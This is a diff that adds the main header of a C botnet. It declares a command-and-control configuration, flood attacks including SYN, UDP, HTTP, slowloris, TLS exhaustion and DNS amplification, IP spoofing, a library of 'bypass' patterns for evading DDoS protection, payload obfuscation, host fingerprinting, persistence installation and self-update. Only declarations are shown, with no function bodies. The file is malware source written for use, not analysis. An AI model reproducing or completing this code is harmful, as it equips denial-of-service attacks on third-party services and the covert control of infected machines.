@@ -1,0 +1,191 @@
+#ifndef BOT_H
+#define BOT_H
+
+#define _GNU_SOURCE
+
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <sched.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <net/if.h>
+#include <netdb.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <signal.h>
+#include <ifaddrs.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/sha.h>
+#include <zlib.h>
+
+/* ── Constants ─────────────────────────────────── */
+#define MAX_PAYLOAD 1472
+#define BURST_SIZE 512
+#define MEGA_BATCH 65535
+#define SOCKETS_PER_THREAD 8
+#define THREAD_MULTIPLIER 2
+#define MAX_SOCKETS 65535
+#define BURST_MULTIPLIER 64
+#define RING_BUF_SIZE 1048576
+#define SOCKET_BUF_SIZE (128 * 1024 * 1024)
+#define MAX_PAYLOADS 10000
+#define MAX_PROCESSES 4
+#define CPU_LOAD_THRESHOLD 75
+
+/* ── Types ─────────────────────────────────────── */
+typedef struct {
+    char c2_host[256];
+    int c2_port;
+    char c2_path[256];
+    int use_ssl;
+    int heartbeat_int;
+    int reconnect_min, reconnect_max, stale_timeout;
+    unsigned int default_pps, default_threads;
+    unsigned int spoof_mode, fragmentation;
+    char bot_version[32];
+} Config;
+
+typedef struct {
+    char hwid[32], ip_addr[64], os_ver[128];
+    int cpu_cores, ram_mb, net_mbps;
+} SysInfo;
+
+typedef struct {
+    char target[256];
+    int port;
+    char method[32];
+    int duration_secs;
+    unsigned int max_pps, max_threads;
+    unsigned int spoof_mode, fragmentation;
+    unsigned int slowloris, tls_exhaust, dns_amp, game_mimic, mega_mode;
+} AttackParams;
+
+typedef struct {
+    double rate, burst, tokens;
+    struct timespec last;
+    pthread_mutex_t mtx;
+} TokenBucket;
+
+/* ── Globals ───────────────────────────────────── */
+extern volatile int g_shutdown;
+extern volatile int g_attack_stop;
+extern unsigned long long g_pkt_count;
+extern unsigned long long g_byte_count;
+extern volatile int g_attack_active;
+extern char g_bot_uuid[64];
+extern char g_cur_task_id[64];
+
+/* ── payload.h ─────────────────────────────────── */
+void gen_payloads(void);
+void gen_http(unsigned char *buf, int *len, const char *host);
+void gen_tls_hello(unsigned char *buf, int *len, const char *sni);
+void gen_game_pkt(unsigned char *buf, int *len);
+void encrypt_payload(unsigned char *buf, int len);
+void obfuscate_payload(unsigned char *buf, int len);
+uint32_t rand_vn_ip(void);
+
+/* Shared payload pool (defined in payload.c) */
+extern unsigned char g_payloads[MAX_PAYLOADS][MAX_PAYLOAD];
+extern int g_payload_lens[MAX_PAYLOADS];
+extern int g_total_payloads;
+extern const unsigned char DNS_ANY_PAYLOAD[];
+extern const size_t DNS_ANY_LEN;
+
+/* Bypass pattern library (ported from src-base-example) */
+typedef struct {
+    char name[64];
+    char payload[256];
+    int length;
+    int effectiveness;
+    int category; /* 0=spoofed, 1=valid/reflection, 2=other */
+} bypass_pattern_t;
+
+extern const bypass_pattern_t enhanced_bypass_patterns[];
+extern const int num_bypass_patterns;
+
+int select_optimal_bypass_pattern(int burst_count, int consecutive_failures);
+void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures);
+void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx);
+
+/* ── cpu_gov.h ─────────────────────────────────── */
+int get_cpu_usage(void);
+void update_cpu_load(void);
+int should_pause(void);
+void cpu_monitor_start(void);
+
+/* ── sock_util.h ──────────────────────────────── */
+int create_udp_socket(void);
+int create_raw_socket(int proto);
+int create_bypass_socket(void);
+uint16_t ip_csum(void *d, size_t l);
+uint16_t tcp_csum(void *ip, void *tcp);
+
+/* ── ws_client.h ──────────────────────────────── */
+typedef struct {
+    int sockfd;
+    SSL *ssl;
+    SSL_CTX *ctx;
+    char host[256], path[256];
+    int port, use_ssl;
+    pthread_mutex_t sm, rm;
+} WS;
+
+int ws_connect(WS *ws, const char *bot_id);
+void ws_disconnect(WS *ws);
+int ws_send(WS *ws, const char *msg);
+int ws_recv(WS *ws, char *buf, int cap);
+
+/* ── attack.h ─────────────────────────────────── */
+void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void syn_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void tcp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void http_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void slowloris(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void dns_amp(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void game_mimic(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void icmp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb);
+void *bg_attack_thread(void *arg);
+
+/* ── sysinfo.h ────────────────────────────────── */
+void sys_info(SysInfo *info);
+void gen_uuid_v4(char *out, int cap);
+void get_bot_uuid(char *out, int cap);
+
+/* ── json.h ───────────────────────────────────── */
+int json_int(const char *msg, const char *key);
+void json_str(const char *msg, const char *key, char *out, int cap);
+
+/* ── daemon.h ─────────────────────────────────── */
+void install_persistence(const char *path);
+void check_updates(const char *ver);
+
+/* ── Inline helpers ────────────────────────────── */
+static inline void pkt_sent(int bytes)
+{
+    __sync_fetch_and_add(&g_pkt_count, 1ULL);
+    __sync_fetch_and_add(&g_byte_count, (unsigned long long)(bytes > 0 ? bytes : 1));
+}
+
+typedef struct {
+    AttackParams atk;
+    Config *cfg;
+} BgAttackCtx;
+
+#endif /* BOT_H */
